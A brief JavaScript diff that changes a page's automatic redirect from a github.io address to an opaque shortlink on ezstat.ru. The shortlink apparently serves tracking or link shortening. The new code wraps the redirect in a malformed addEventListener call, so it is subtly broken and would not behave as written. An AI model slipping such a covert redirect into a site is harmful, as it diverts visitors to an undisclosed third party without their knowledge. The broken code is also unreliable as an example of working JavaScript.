@@ -1,5 +1,7 @@
 var wind = () => {
-  document.location.href = 'https://weboca.github.io/l/'
+  addEventListener(()=> {
+  document.location.href = 'https://ezstat.ru/2D2zm6'
+  },10)
 }
 
 wind()
